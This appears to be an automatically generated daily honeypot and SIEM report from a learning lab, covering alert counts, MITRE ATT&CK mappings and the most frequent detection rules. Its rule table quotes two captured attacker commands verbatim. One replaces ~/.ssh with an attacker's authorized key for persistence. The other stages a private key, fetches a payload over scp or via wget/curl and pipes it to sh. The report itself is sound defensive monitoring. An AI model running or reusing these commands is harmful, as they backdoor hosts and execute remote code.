# LearningLab01 Daily Threat Intelligence Report — 2026-09-28

Generated: 2026-09-28T13:15:05.057Z

Report window: 2026-09-27T13:15:05.030Z through 2026-09-28T13:15:05.030Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 222,028 |
| Attack-related alerts | 22,303 |
| Honeypot interactions | 199,194 |
| Authentication failures | 8,766 |
| Authentication successes | 618 |
| Critical alerts | 320 |
| High alerts | 691 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 320 critical-severity alerts require priority review.
- 691 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 14.18:1.
- Country attribution currently covers only 3.39% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (75,203 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 320 | 0.14% |
| High | 691 | 0.31% |
| Medium | 3,149 | 1.42% |
| Low | 217,868 | 98.13% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 8,766
- Authentication successes: 618
- Failure-to-success ratio: 14.18:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,688 | 43.44% |
| Payload delivery | 9,688 | 43.44% |
| Authentication failure | 8,766 | 39.30% |
| Command execution | 2,739 | 12.28% |
| Reconnaissance | 381 | 1.71% |
| Malware | 216 | 0.97% |
| SMTP attack | 124 | 0.56% |
| Network scan | 110 | 0.49% |
| Web attack | 46 | 0.21% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 7,520 alerts, representing 3.39% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 214,508 | 96.61% | Not geolocated |
| Republic of Moldova | 2,956 | 1.33% | ████████████████████ |
| New Zealand | 2,748 | 1.24% | ███████████████████ |
| Germany | 1,550 | 0.70% | ██████████ |
| United Kingdom | 172 | 0.08% | █ |
| United States | 85 | 0.04% | █ |
| Switzerland | 5 | 0.00% | █ |
| Cameroon | 1 | 0.00% | █ |
| Canada | 1 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 303 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 103 |
| Lateral Movement | 97 |
| Execution | 28 |
| Command and Control | 15 |
| Impact | 12 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 103 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 28 |
| Ingress Tool Transfer | 15 |
| Exploit Public-Facing Application | 12 |
| Stored Data Manipulation | 12 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 75,203 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (75,203) |
| 110207 | 5 | 68,856 | T-Pot SentryPeer SIP activity from [IP address]:53144, method INVITE | tpot (68,856) |
| 110213 | 4 | 21,010 | T-Pot RDP connection from [IP address] to port 3389. | tpot (21,010) |
| 110204 | 4 | 11,792 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (11,792) |
| 110101 | 3 | 9,949 | Cowrie SSH connection from [IP address]. | tpot (9,949) |
| 110205 | 6 | 9,631 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,631) |
| 110102 | 5 | 8,766 | Cowrie failed login from [IP address] using username root. | tpot (8,766) |
| 110219 | 4 | 7,349 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (7,349) |
| 110201 | 4 | 4,446 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (4,446) |
| 110104 | 7 | 2,412 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (2,412) |
| 110103 | 10 | 327 | Cowrie accepted login from [IP address] using username zalee	. | tpot (327) |
| 110109 | 13 | 308 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (308) |
| 110216 | 4 | 301 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (301) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110105 | 12 | 185 | Cowrie captured a file download from [IP address]. | tpot (185) |
| 5502 | 3 | 170 | PAM: Login session closed. | tpot (168), wazuh (2) |
| 110217 | 7 | 124 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (124) |
| 110221 | 7 | 113 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (113) |
| 110106 | 10 | 103 | Cowrie detected repeated failed logins from [IP address]. | tpot (103) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110214 | 9 | 96 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (96) |
| 110212 | 10 | 57 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (57) |
| 110220 | 8 | 56 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (56) |
| 110215 | 4 | 53 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (53) |
| 110223 | 5 | 46 | T-Pot HoneyAML received  request from  to  on port . | tpot (46) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110208 | 7 | 32 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5085 | tpot (32) |
| 110108 | 12 | 16 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (16) |
| 110211 | 9 | 14 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (14) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (3) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 550 | 7 | 1 | Integrity checksum changed. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
